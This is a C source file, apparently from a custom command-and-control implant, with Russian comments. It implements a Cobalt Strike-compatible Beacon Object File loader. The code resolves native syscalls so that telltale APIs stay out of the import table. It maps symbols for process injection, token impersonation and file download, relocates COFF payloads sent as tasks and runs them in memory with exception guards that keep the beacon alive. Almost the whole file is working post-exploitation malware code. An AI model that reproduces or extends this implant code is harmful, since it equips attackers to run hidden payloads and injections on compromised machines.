    RESOLVE_SC(ntDeviceIoControlFile,     "NtDeviceIoControlFile");
    RESOLVE_SC(ntWaitForMultipleObjects,  "NtWaitForMultipleObjects");

    #undef RESOLVE_SC

    // RTL-функции.
    info->rtls.rtlDosPathNameToNtPathNameUWithStatusAddr =
        (void*)GetProcAddress(nt, "RtlDosPathNameToNtPathName_UWithStatus");
    info->rtls.rtlFreeHeapAddr       = (void*)GetProcAddress(nt, "RtlFreeHeap");
    info->rtls.rtlGetProcessHeapAddr = (void*)GetProcAddress(nt, "RtlGetProcessHeap");

    return TRUE;
}

// ---- CS 4.10+: обёртки сисколлов (вызывают стандартные WinAPI) --------------

// Nt-backed wrappers — no kernel32 VirtualAlloc/WriteProcessMemory/etc. in IAT.
static LPVOID _bof_virtual_alloc(LPVOID a, SIZE_T s, DWORD t, DWORD p) {
    PVOID b = a; SIZE_T sz = s;
    NtAllocateVirtualMemory_i(GetCurrentProcess(), &b, 0, &sz, t, p);
    return b;
}
static LPVOID _bof_virtual_alloc_ex(HANDLE h, LPVOID a, SIZE_T s, DWORD t, DWORD p) {
    PVOID b = a; SIZE_T sz = s;
    NtAllocateVirtualMemory_i(h, &b, 0, &sz, t, p);
    return b;
}
static BOOL _bof_virtual_protect(LPVOID a, SIZE_T s, DWORD np, DWORD* op) {
    return nt_protect_local(a, s, np, op);
}
static BOOL _bof_virtual_protect_ex(HANDLE h, LPVOID a, SIZE_T s, DWORD np, DWORD* op) {
    PVOID b = a; SIZE_T sz = s;
    return NtProtectVirtualMemory_i(h, &b, &sz, np, op) >= 0 ? TRUE : FALSE;
}
static BOOL _bof_virtual_free(LPVOID a, SIZE_T s, DWORD t) {
    SIZE_T sz = s;
    return NtFreeVirtualMemory_i(GetCurrentProcess(), &a, &sz, t) >= 0 ? TRUE : FALSE;
}
static BOOL   _bof_get_thread_ctx(HANDLE h, CONTEXT* c)                                          { return GetThreadContext(h, c); }
static BOOL   _bof_set_thread_ctx(HANDLE h, CONTEXT* c)                                          { return SetThreadContext(h, c); }
static DWORD  _bof_resume_thread(HANDLE h)                                                       { return ResumeThread(h); }
static HANDLE _bof_open_process(DWORD a, BOOL i, DWORD p)                                        { (void)i; return nt_open_process(a, p); }
static HANDLE _bof_open_thread(DWORD a, BOOL i, DWORD t)                                         { return OpenThread(a, i, t); }
static BOOL   _bof_close_handle(HANDLE h)                                                        { return CloseHandle(h); }
static BOOL   _bof_unmap_view(LPCVOID a)                                                         { return UnmapViewOfFile(a); }
static SIZE_T _bof_virtual_query(LPCVOID a, MEMORY_BASIC_INFORMATION* b, SIZE_T l)                { return VirtualQuery(a, b, l); }
static BOOL   _bof_dup_handle(HANDLE sp, HANDLE sh, HANDLE tp, HANDLE* th, DWORD a, BOOL i, DWORD o) { return DuplicateHandle(sp, sh, tp, th, a, i, o); }
static BOOL _bof_read_proc_mem(HANDLE h, LPCVOID ba, LPVOID buf, SIZE_T n, SIZE_T* r) {
    SIZE_T rd = 0;
    NTSTATUS s = NtReadVirtualMemory_i(h, (PVOID)ba, buf, n, &rd);
    if (r) *r = rd;
    return s >= 0 ? TRUE : FALSE;
}
static BOOL _bof_write_proc_mem(HANDLE h, LPVOID ba, LPCVOID buf, SIZE_T n, SIZE_T* w) {
    SIZE_T wr = 0;
    NTSTATUS s = NtWriteVirtualMemory_i(h, ba, (PVOID)buf, n, &wr);
    if (w) *w = wr;
    return s >= 0 ? TRUE : FALSE;
}

// ---- CS 4.10+: Beacon Gate (заглушки — у нас нет beacon gate) --------------

static void _bof_gate_noop(void) {}

// ---- Symbol table for BOF __imp_ resolution --------------------------------

typedef struct { const char* name; void* fn; } SymEntry;

#define SYM(n, f) { n, (void*)(f) }

static const SymEntry g_sym_table[] = {
    SYM("BeaconPrintf",             _bof_printf),
    SYM("BeaconOutput",             _bof_output),
    SYM("BeaconDataParse",          _bof_data_parse),
    SYM("BeaconDataInt",            _bof_data_int),
    SYM("BeaconDataShort",          _bof_data_short),
    SYM("BeaconDataLength",         _bof_data_length),
    SYM("BeaconDataExtract",        _bof_data_extract),
    SYM("BeaconFormatAlloc",        _bof_format_alloc),
    SYM("BeaconFormatFree",         _bof_format_free),
    SYM("BeaconFormatReset",        _bof_format_reset),
    SYM("BeaconFormatAppend",       _bof_format_append),
    SYM("BeaconFormatToString",     _bof_format_tostr),
    SYM("BeaconGetSpawnTo",         _bof_get_spawnto),
    SYM("BeaconIsAdmin",            _bof_is_admin),
    SYM("BeaconDataPtr",            _bof_data_ptr),
    SYM("BeaconFormatInt",          _bof_format_int),
    SYM("BeaconFormatPrintf",       _bof_format_printf),
    SYM("BeaconDownload",                  _bof_download),
    // ExitProcess/ExitThread перехватываем — BOF не должен убивать beacon.
    SYM("ExitProcess",                     _bof_exit_process),
    SYM("ExitThread",                      _bof_exit_thread),
    SYM("BeaconUseToken",                  _bof_use_token),
    SYM("BeaconRevertToken",               _bof_revert_token),
    SYM("BeaconSpawnTemporaryProcess",     _bof_spawn_temp),
    SYM("BeaconInjectProcess",             _bof_inject_process),
    SYM("BeaconInjectTemporaryProcess",    _bof_inject_temp_process),
    SYM("BeaconCleanupProcess",            _bof_cleanup_process),
    SYM("toWideChar",                      _bof_to_widechar),
    SYM("AxDownloadMemory",         _bof_download),     // Adaptix alias
    SYM("AxAddScreenshot",          _bof_download),     // Adaptix alias — файл с именем note
    // CS 4.9+: Key/Value хранилище
    SYM("BeaconAddValue",                     _bof_add_value),
    SYM("BeaconGetValue",                     _bof_get_value),
    SYM("BeaconRemoveValue",                  _bof_remove_value),
    // CS 4.9+: информация о бикон-процессе
    SYM("BeaconInformation",                  _bof_information),
    // CS 4.9+: Data Store
    SYM("BeaconDataStoreGetItem",             _bof_ds_get_item),
    SYM("BeaconDataStoreProtectItem",         _bof_ds_protect),
    SYM("BeaconDataStoreUnprotectItem",       _bof_ds_unprotect),
    SYM("BeaconDataStoreMaxEntries",          _bof_ds_max_entries),
    // CS 4.9+: пользовательские данные
    SYM("BeaconGetCustomUserData",            _bof_get_custom_user_data),
    // CS 4.10+: информация о сисколлах
    SYM("BeaconGetSyscallInformation",        _bof_get_syscall_info),
    // CS 4.10+: обёртки сисколлов (вызывают стандартные WinAPI)
    SYM("BeaconVirtualAlloc",                 _bof_virtual_alloc),
    SYM("BeaconVirtualAllocEx",               _bof_virtual_alloc_ex),
    SYM("BeaconVirtualProtect",               _bof_virtual_protect),
    SYM("BeaconVirtualProtectEx",             _bof_virtual_protect_ex),
    SYM("BeaconVirtualFree",                  _bof_virtual_free),
    SYM("BeaconGetThreadContext",             _bof_get_thread_ctx),
    SYM("BeaconSetThreadContext",             _bof_set_thread_ctx),
    SYM("BeaconResumeThread",                 _bof_resume_thread),
    SYM("BeaconOpenProcess",                  _bof_open_process),
    SYM("BeaconOpenThread",                   _bof_open_thread),
    SYM("BeaconCloseHandle",                  _bof_close_handle),
    SYM("BeaconUnmapViewOfFile",              _bof_unmap_view),
    SYM("BeaconVirtualQuery",                 _bof_virtual_query),
    SYM("BeaconDuplicateHandle",              _bof_dup_handle),
    SYM("BeaconReadProcessMemory",            _bof_read_proc_mem),
    SYM("BeaconWriteProcessMemory",           _bof_write_proc_mem),
    // CS 4.10+: Beacon Gate (заглушки — у нас нет beacon gate)
    SYM("BeaconDisableBeaconGate",            _bof_gate_noop),
    SYM("BeaconEnableBeaconGate",             _bof_gate_noop),
    SYM("BeaconDisableBeaconGateMasking",     _bof_gate_noop),
    SYM("BeaconEnableBeaconGateMasking",      _bof_gate_noop),
    { NULL, NULL }
};

// Resolve "Module$Function" через GetProcAddress (обрабатывает форвардеры).
// api_resolve не используем — он не умеет разрешать forwarded exports
// (например msvcrt!calloc → ucrtbase!calloc через api-ms-win-crt-*).
// GetProcAddress делает это корректно из коробки.
// Если модуль не загружен — LoadLibraryA подтянет его.
static void* resolve_imp(const char* mod_fn) {
    // Format: "Module$Function" (no __imp_ prefix; caller strips it)
    const char* dollar = mod_fn;
    while (*dollar && *dollar != '$') ++dollar;
    if (!*dollar) return NULL;

    // Build module name "Module.dll"
    size_t mlen = (size_t)(dollar - mod_fn);
    char dll[64];
    size_t dlen = mlen < 59 ? mlen : 59;
    rt_memcpy(dll, mod_fn, dlen);
    rt_memcpy(dll + dlen, ".dll", 5);

    const char* fn = dollar + 1;

#if defined(_M_IX86)
    // x86 COFF: stdcall добавляет @N суффикс (N = размер аргументов).
    // GetProcAddress ожидает имя без суффикса → обрезаем.
    char fn_clean[128];
    {
        const char* at = fn;
        while (*at && *at != '@') ++at;
        if (*at == '@') {
            size_t flen = (size_t)(at - fn);
            if (flen > 127) flen = 127;
            rt_memcpy(fn_clean, fn, flen);
            fn_clean[flen] = 0;
            fn = fn_clean;
        }
    }
#endif

    // Сначала GetModuleHandleA — без загрузки, если уже в процессе.
    HMODULE hm = GetModuleHandleA(dll);
    if (!hm) {
        // Модуль не загружен — загружаем. Типично для MSVCRT, IPHLPAPI и т.д.
        hm = LoadLibraryA(dll);
        if (!hm) return NULL;
    }

    // GetProcAddress сам обрабатывает forwarded exports.
    return (void*)GetProcAddress(hm, fn);
}

// ---- COFF loader -----------------------------------------------------------

#define MAX_SECTIONS 32
#define MAX_IMPORTS  256

// Per-section allocated memory.
typedef struct {
    uint8_t* mem;
    size_t   size;
    DWORD    orig_chars;
} SecMem;

int bof_execute(const uint8_t* coff, size_t coff_len,
                const char* entry, const uint8_t* args, size_t args_len) {
    int ret = -4;

    bof_dbg("execute: entry=", entry);

    if (coff_len < sizeof(IMAGE_FILE_HEADER)) {
        bof_dbg("execute: ERROR", "coff too small");
        return -1;
    }

    const IMAGE_FILE_HEADER* fh = (const IMAGE_FILE_HEADER*)coff;
#if defined(_M_X64)
    // x64 бикон: принимаем только x64 COFF.
    if (fh->Machine != IMAGE_FILE_MACHINE_AMD64) {
        bof_dbg("execute: ERROR", "not AMD64");
        return -2;
    }
#else
    // x86 бикон: принимаем только x86 COFF.
    if (fh->Machine != IMAGE_FILE_MACHINE_I386) {
        bof_dbg("execute: ERROR", "not i386");
        return -2;
    }
#endif

    WORD  nsec   = fh->NumberOfSections;
    DWORD symoff = fh->PointerToSymbolTable;
    DWORD nsym   = fh->NumberOfSymbols;

    bof_dbg_u32("execute: nsec=", nsec);
    bof_dbg_u32("execute: nsym=", nsym);

    if (nsec > MAX_SECTIONS) {
        bof_dbg("execute: ERROR", "too many sections");
        return -3;
    }

    const IMAGE_SECTION_HEADER* shdrs =
        (const IMAGE_SECTION_HEADER*)(coff + sizeof(IMAGE_FILE_HEADER));

    // ---- Один VirtualAlloc-блок для всех секций + таблицы импортов ----------
    //
    // Критично для x64: IMAGE_REL_AMD64_REL32 — 32-битное смещение (±2 ГБ).
    // imp_ptrs на стеке bof_execute находится в другом адресном диапазоне чем
    // память выделенная VirtualAlloc, расстояние легко превышает 2 ГБ →
    // переполнение смещения → вызов по мусорному адресу → краш.
    // Решение: imp_ptrs живёт в хвосте того же VirtualAlloc-блока что и секции,
    // поэтому расстояние от кода до таблицы не превышает размера самого блока.
    //
    // Секции выровнены по 4096 (размер страницы) чтобы VirtualProtect не
    // задевал соседние данные при выставлении PAGE_EXECUTE_READ.

#define PAGE_SZ 4096
#define PAGE_ALIGN(n) (((size_t)(n) + PAGE_SZ - 1) & ~(size_t)(PAGE_SZ - 1))

    // Проход 1: вычислить суммарный размер и смещения секций.
    size_t sec_offsets[MAX_SECTIONS];
    size_t total = 0;
    for (WORD i = 0; i < nsec; ++i) {
        size_t sz = shdrs[i].SizeOfRawData;
        if (!sz) sz = shdrs[i].Misc.VirtualSize;
        if (!sz) { sec_offsets[i] = (size_t)-1; continue; }
        sec_offsets[i] = total;
        total += PAGE_ALIGN(sz);   // каждая секция на своей(их) странице(ах)
    }
    // Таблица импортов в хвосте — тоже выровнена.
    size_t imp_offset = total;
    total += PAGE_ALIGN(sizeof(void*) * MAX_IMPORTS);

    // x64 SEH: резервируем место для RUNTIME_FUNCTION + UNWIND_INFO в хвосте блока.
    // Без регистрации через RtlAddFunctionTable unwinder не может раскрутить стек
    // через BOF-код (нет .pdata) → исключение внутри BOF убивает весь процесс.
#if defined(_M_X64)
    size_t rtf_offset = total;
    // RUNTIME_FUNCTION: 3 * DWORD = 12 байт; UNWIND_INFO минимум 4 байта.
    total += PAGE_ALIGN(16 + 4);
#endif

    // Выделяем один блок RW.
    uint8_t* block = (uint8_t*)nt_alloc_local(total, PAGE_READWRITE);
    if (!block) {
        bof_dbg("execute: ERROR", "VirtualAlloc block failed");
        return -4;
    }

    // imp_ptrs указывает в хвост того же блока.
    void** imp_ptrs = (void**)(block + imp_offset);
    int    imp_count = 0;

    // SecMem — только метаданные (mem/size/chars), память уже в block.
    SecMem smem[MAX_SECTIONS];
    rt_memset(smem, 0, sizeof(smem));

    // Проход 2: скопировать данные секций в блок.
    for (WORD i = 0; i < nsec; ++i) {
        if (sec_offsets[i] == (size_t)-1) continue;
        size_t sz = shdrs[i].SizeOfRawData;
        if (!sz) sz = shdrs[i].Misc.VirtualSize;
        smem[i].mem        = block + sec_offsets[i];
        smem[i].size       = sz;
        smem[i].orig_chars = shdrs[i].Characteristics;
        if (shdrs[i].PointerToRawData && shdrs[i].SizeOfRawData)
            rt_memcpy(smem[i].mem, coff + shdrs[i].PointerToRawData,
                      shdrs[i].SizeOfRawData);
        // Остаток страницы уже нулевой (VirtualAlloc обнуляет).
    }

    // Symbol table (COFF symbols, 18 bytes each).
    const IMAGE_SYMBOL* syms   = (const IMAGE_SYMBOL*)(coff + symoff);
    const char*         strtab = (const char*)(syms + nsym);

    // ---- Apply relocations for each section --------------------------------
    for (WORD si = 0; si < nsec; ++si) {
        if (!shdrs[si].NumberOfRelocations) continue;
        const IMAGE_RELOCATION* rels =
            (const IMAGE_RELOCATION*)(coff + shdrs[si].PointerToRelocations);

        for (WORD ri = 0; ri < shdrs[si].NumberOfRelocations; ++ri) {
            const IMAGE_RELOCATION* rel = &rels[ri];
            DWORD sym_idx = rel->SymbolTableIndex;
            if (sym_idx >= nsym) continue;

            const IMAGE_SYMBOL* sym = &syms[sym_idx];

            char sym_name[256];
            if (sym->N.Name.Short) {
                rt_memcpy(sym_name, sym->N.ShortName, 8);
                sym_name[8] = 0;
            } else {
                const char* sn = strtab + sym->N.Name.Long;
                size_t snl = rt_strlen(sn);
                if (snl > 255) snl = 255;
                rt_memcpy(sym_name, sn, snl);
                sym_name[snl] = 0;
            }

            uint64_t target_va = 0;
            if (sym->SectionNumber > 0 && sym->SectionNumber <= nsec) {
                uint16_t tidx = (uint16_t)(sym->SectionNumber - 1);
                target_va = (uint64_t)(uintptr_t)(smem[tidx].mem + sym->Value);
            } else if (sym->SectionNumber == 0) {
                if (rt_memcmp(sym_name, "__imp_", 6) == 0) {
                    const char* imp_name = sym_name + 6;
#if defined(_M_IX86)
                    // x86 COFF: cdecl/stdcall добавляет `_` префикс.
                    // __imp__BeaconPrintf → после __imp_ остаётся _BeaconPrintf → пропускаем _.
                    if (imp_name[0] == '_') ++imp_name;
#endif
                    void* fn = NULL;
                    for (const SymEntry* e = g_sym_table; e->name; ++e) {
                        if (rt_memcmp(e->name, imp_name, rt_strlen(e->name)+1) == 0) {
                            if (e->fn) fn = e->fn;
                            break;
                        }
                    }
                    if (!fn) fn = resolve_imp(imp_name);
                    if (!fn) {
                        bof_dbg("imp FAILED: ", imp_name);
                        continue;
                    }
                    bof_dbg("imp ok: ", imp_name);
                    if (imp_count >= MAX_IMPORTS) continue;
                    imp_ptrs[imp_count] = fn;
                    // target_va = адрес слота в хвосте ТОГО ЖЕ блока.
                    target_va = (uint64_t)(uintptr_t)&imp_ptrs[imp_count];
                    ++imp_count;
                }
            }

            if (!target_va) continue;

            uint8_t* patch = smem[si].mem + rel->VirtualAddress;
            switch (rel->Type) {
#if defined(_M_X64)
                case IMAGE_REL_AMD64_ADDR64: {
                    // Адденд уже записан компилятором в patch — прибавляем адрес символа.
                    uint64_t existing;
                    rt_memcpy(&existing, patch, sizeof(uint64_t));
                    existing += target_va;
                    rt_memcpy(patch, &existing, sizeof(uint64_t));
                    break;
                }
                case IMAGE_REL_AMD64_ADDR32NB: {
                    // RVA-like: читаем адденд и прибавляем дельту.
                    int32_t existing;
                    rt_memcpy(&existing, patch, sizeof(int32_t));
                    existing += (int32_t)((int64_t)target_va -
                                (int64_t)(uintptr_t)(patch + 4));
                    rt_memcpy(patch, &existing, sizeof(int32_t));
                    break;
                }
                case IMAGE_REL_AMD64_REL32:
                case IMAGE_REL_AMD64_REL32_1:
                case IMAGE_REL_AMD64_REL32_2:
                case IMAGE_REL_AMD64_REL32_3:
                case IMAGE_REL_AMD64_REL32_4:
                case IMAGE_REL_AMD64_REL32_5: {
                    uint8_t off = (uint8_t)(rel->Type - IMAGE_REL_AMD64_REL32);
                    // Читаем существующий адденд и прибавляем дельту.
                    int32_t existing;
                    rt_memcpy(&existing, patch, sizeof(int32_t));
                    existing += (int32_t)((int64_t)target_va -
                                (int64_t)(uintptr_t)(patch + 4 + off));
                    rt_memcpy(patch, &existing, sizeof(int32_t));
                    break;
                }
#else
                // x86 COFF: IMAGE_REL_I386_DIR32 (абсолютный 32-бит адрес)
                // и IMAGE_REL_I386_REL32 (относительный 32-бит).
                case IMAGE_REL_I386_DIR32: {
                    uint32_t existing;
                    rt_memcpy(&existing, patch, sizeof(uint32_t));
                    existing += (uint32_t)target_va;
                    rt_memcpy(patch, &existing, sizeof(uint32_t));
                    break;
                }
                case IMAGE_REL_I386_REL32: {
                    int32_t existing;
                    rt_memcpy(&existing, patch, sizeof(int32_t));
                    existing += (int32_t)((int32_t)target_va -
                                (int32_t)(uintptr_t)(patch + 4));
                    rt_memcpy(patch, &existing, sizeof(int32_t));
                    break;
                }
#endif
            }
        }
    }

    // ---- Сделать исполняемые секции RX (они на своих страницах) ------------
    bof_dbg("execute: ", "VirtualProtect sections RX...");
    for (WORD i = 0; i < nsec; ++i) {
        if (!smem[i].mem) continue;
        if (smem[i].orig_chars & IMAGE_SCN_MEM_EXECUTE) {
            DWORD old;
            BOOL vp = nt_protect_local(smem[i].mem, smem[i].size, PAGE_EXECUTE_READ, &old);
            if (!vp) bof_dbg_u32("execute: VP failed sec=", i);
        }
    }
    FlushInstructionCache((HANDLE)-1, block, total);

#if defined(_M_X64)
    // Регистрируем фиктивную RUNTIME_FUNCTION для всего блока BOF.
    // Запись "без пролога" (CountOfCodes=0) — unwinder просто пропускает
    // этот фрейм при раскрутке стека, позволяя SEH-обработчику в вызывающем
    // коде поймать исключение из BOF.
    typedef struct { DWORD Begin; DWORD End; DWORD UnwindData; } RTF;
    // Минимальный UNWIND_INFO: Version=1, Flags=0, SizeOfProlog=0, CountOfCodes=0.
    typedef struct { BYTE VersionFlags; BYTE SizeOfProlog;
                     BYTE CountOfCodes; BYTE FrameInfo; } UWI;

    RTF* pRtf = (RTF*)(block + rtf_offset);
    UWI* pUwi = (UWI*)(block + rtf_offset + sizeof(RTF));

    pUwi->VersionFlags  = 1; // Version=1, Flags=0
    pUwi->SizeOfProlog  = 0;
    pUwi->CountOfCodes  = 0;
    pUwi->FrameInfo     = 0;

    pRtf->Begin      = 0;
    pRtf->End        = (DWORD)imp_offset; // только секции, без imp_ptrs
    pRtf->UnwindData = (DWORD)((uint8_t*)pUwi - block);

    typedef BOOLEAN (WINAPI* pfnRtlAddFunctionTable)(
        void* FunctionTable, DWORD EntryCount, DWORD64 BaseAddress);
    typedef BOOLEAN (WINAPI* pfnRtlDeleteFunctionTable)(void* FunctionTable);

    HMODULE ntdll2 = GetModuleHandleA("ntdll.dll");
    pfnRtlAddFunctionTable    fnAdd = ntdll2
        ? (pfnRtlAddFunctionTable)   GetProcAddress(ntdll2, "RtlAddFunctionTable")    : NULL;
    pfnRtlDeleteFunctionTable fnDel = ntdll2
        ? (pfnRtlDeleteFunctionTable)GetProcAddress(ntdll2, "RtlDeleteFunctionTable") : NULL;

    if (fnAdd) fnAdd(pRtf, 1, (DWORD64)(uintptr_t)block);
#endif

    // ---- Найти и вызвать точку входа ---------------------------------------
    bof_dbg("execute: ", "searching entry point...");
    void* ep = NULL;
    for (DWORD si = 0; si < nsym; ++si) {
        const IMAGE_SYMBOL* sym = &syms[si];
        char sym_name[256];
        if (sym->N.Name.Short) {
            rt_memcpy(sym_name, sym->N.ShortName, 8);
            sym_name[8] = 0;
        } else {
            const char* sn = strtab + sym->N.Name.Long;
            size_t snl = rt_strlen(sn);
            if (snl > 255) snl = 255;
            rt_memcpy(sym_name, sn, snl);
            sym_name[snl] = 0;
        }
        int ep_match = (rt_memcmp(sym_name, entry, rt_strlen(entry)+1) == 0);
#if defined(_M_IX86)
        // x86 COFF: cdecl entry point получает `_` префикс → _go вместо go.
        if (!ep_match && sym_name[0] == '_')
            ep_match = (rt_memcmp(sym_name + 1, entry, rt_strlen(entry)+1) == 0);
#endif
        if (ep_match && sym->SectionNumber > 0) {
            uint16_t tidx = (uint16_t)(sym->SectionNumber - 1);
            ep = smem[tidx].mem + sym->Value;
            break;
        }
    }

    if (ep) {
        bof_dbg_ptr("execute: ep=", (uint64_t)(uintptr_t)ep);

        // Дамп первых 8 байт по адресу точки входа.
        // Ожидаемый пролог x64 MSVC: 48 89 5C / 48 83 EC / 40 55 / 41 56...
        {
            const uint8_t* b = (const uint8_t*)ep;
            char hex[48]; int hi = 0;
            const char* h = "0123456789abcdef";
            for (int i = 0; i < 8; ++i) {
                hex[hi++] = h[(b[i] >> 4) & 0xF];
                hex[hi++] = h[b[i] & 0xF];
                hex[hi++] = ' ';
            }
            hex[hi] = 0;
            bof_dbg("ep bytes: ", hex);
        }

        // Первые 4 слота imp_ptrs: адрес функции-хендлера.
        {
            char hex[20];
            for (int i = 0; i < 4 && i < imp_count; ++i) {
                bof_ptr_to_hex(hex, (uint64_t)(uintptr_t)imp_ptrs[i]);
                bof_dbg("imp_ptr val: ", hex);
            }
        }

        // block base и полный размер блока.
        bof_dbg_ptr("block base=", (uint64_t)(uintptr_t)block);
        bof_dbg_ptr("imp_ptrs @ ", (uint64_t)(uintptr_t)imp_ptrs);
        bof_dbg_u32("total bytes=", (uint32_t)total);

        bof_dbg("execute: ", "calling ep...");
        // bof_call_aligned выравнивает RSP к кратному 16 перед CALL —
        // без этого BOF падает на XMM-инструкциях и MSVCRT-функциях (sprintf и др.).
        // Объявлен в bof/bof_call.asm, собирается ml64.exe только для x64.
        // SEH-обёртка перехватывает исключения внутри BOF (ACCESS_VIOLATION и т.п.)
        // и выводит код ошибки вместо краша всего beacon-процесса.
#if defined(_M_X64)
        DWORD seh_code = 0;
        __try {
            bof_call_aligned(ep, (const char*)args, (int)args_len);
        } __except (seh_code = GetExceptionCode(), EXCEPTION_EXECUTE_HANDLER) {
            char seh_msg[48];
            const char pfx[] = "SEH exception: 0x";
            const char hx[]  = "0123456789ABCDEF";
            int n = 0;
            for (int k = 0; pfx[k]; ++k) seh_msg[n++] = pfx[k];
            for (int s = 28; s >= 0; s -= 4)
                seh_msg[n++] = hx[(seh_code >> s) & 0xF];
            seh_msg[n++] = '\n'; seh_msg[n] = '\0';
            out_write(seh_msg, (size_t)n);
            out_flush_chunk(get_transport(), 0);
            ret = -2;
        }
        if (ret != -2) {
            bof_dbg("execute: ", "ep returned ok");
            ret = 0;
        }
#else
        // x86: __try/__except без CRT требует _except_handler3 — недоступен.
        // Используем ASM-обёртку bof_call_x86 с ручным SEH через FS:[0].
        DWORD seh_code = 0;
        bof_call_x86(ep, (const char*)args, (int)args_len, &seh_code);
        if (seh_code) {
            char seh_msg[48];
            const char pfx[] = "SEH exception: 0x";
            const char hx[]  = "0123456789ABCDEF";
            int n = 0;
            for (int k = 0; pfx[k]; ++k) seh_msg[n++] = pfx[k];
            for (int s = 28; s >= 0; s -= 4)
                seh_msg[n++] = hx[(seh_code >> s) & 0xF];
            seh_msg[n++] = '\n'; seh_msg[n] = '\0';
            out_write(seh_msg, (size_t)n);
            out_flush_chunk(get_transport(), 0);
            ret = -2;
        } else {
            bof_dbg("execute: ", "ep returned ok");
            ret = 0;
        }
#endif
    } else {
        bof_dbg("execute: ERROR entry not found: ", entry);
    }

#if defined(_M_X64)
    // Снимаем регистрацию RUNTIME_FUNCTION — блок сейчас будет освобождён.
    if (fnDel) fnDel(pRtf);
#endif

    // ---- Очистка: сброс защиты, зануление, освобождение одного блока -------
    {
        DWORD old;
        nt_protect_local(block, total, PAGE_READWRITE, &old);
        rt_memset(block, 0, total);
        nt_free_local(block);
        block = NULL;
    }
    return ret;
}

// ---- cmd_bof dispatcher (called from tasking.c) ----------------------------

// Task ID текущего BOF — нужен _bof_download для прямой отправки RESP_FILE.
uint64_t g_bof_task_id = 0;

void cmd_bof(const BeaconTask* t) {
    g_bof_task_id = t->id;
    // Новый формат: [u32 entry_len][entry][u32 args_len][args][COFF]
    // Старый формат: [u32 entry_len][entry][COFF]
    // Автодетект: пробуем прочитать args_len — если off + args_len + что-то для COFF
    // не вписывается в pay_len, считаем старый формат (args_len=0, COFF сразу после entry).
    if (!t->pay || t->pay_len < 5) {
        const char err[] = "bof: bad payload\n";
        out_write(err, sizeof(err)-1);
        return;
    }
    size_t off = 0;

    // entry_len + entry
    uint32_t entry_len =
        (uint32_t)t->pay[0] | ((uint32_t)t->pay[1] << 8) |
        ((uint32_t)t->pay[2] << 16) | ((uint32_t)t->pay[3] << 24);
    off = 4;
    if (off + entry_len > t->pay_len) {
        const char err[] = "bof: bad entry len\n";
        out_write(err, sizeof(err)-1);
        return;
    }
    char entry[128];
    size_t el = entry_len < 127 ? entry_len : 127;
    rt_memcpy(entry, t->pay + off, el);
    entry[el] = '\0';
    off += entry_len;

    // Пытаемся прочитать args_len (новый формат).
    // Если оставшихся байт хватает на u32 args_len и args_len валиден — новый формат.
    // Иначе — старый формат: COFF начинается сразу после entry.
    const uint8_t* args = NULL;
    size_t args_len = 0;

    if (off + 4 <= t->pay_len) {
        uint32_t candidate =
            (uint32_t)t->pay[off]   | ((uint32_t)t->pay[off+1] << 8) |
            ((uint32_t)t->pay[off+2] << 16) | ((uint32_t)t->pay[off+3] << 24);
        // Валидация: args_len + 4 (сам u32) + хотя бы 20 байт COFF (IMAGE_FILE_HEADER)
        // должны вписаться в оставшийся payload.
        if (off + 4 + candidate + 20 <= t->pay_len) {
            // Дополнительная проверка: первые 2 байта после args должны быть
            // валидным COFF Machine (0x8664 для AMD64 или 0x014C для i386).
            size_t coff_start = off + 4 + candidate;
            uint16_t machine =
                (uint16_t)t->pay[coff_start] | ((uint16_t)t->pay[coff_start+1] << 8);
            if (machine == 0x8664 || machine == 0x014C) {
                // Новый формат подтверждён.
                args_len = (size_t)candidate;
                off += 4;
                args = args_len ? (t->pay + off) : NULL;
                off += args_len;
            }
            // Иначе — старый формат, off не меняем.
        }
        // Иначе — старый формат, off не меняем.
    }

    // COFF
    const uint8_t* coff = t->pay + off;
    size_t coff_len = t->pay_len - off;

    int rc = bof_execute(coff, coff_len, entry, args, (size_t)args_len);
    if (rc != 0) {
        char msg[] = "bof: failed (code -X)\n";
        if (rc < 0 && rc > -10) msg[17] = (char)('0' - rc);
        out_write(msg, sizeof(msg)-1);
    }
}
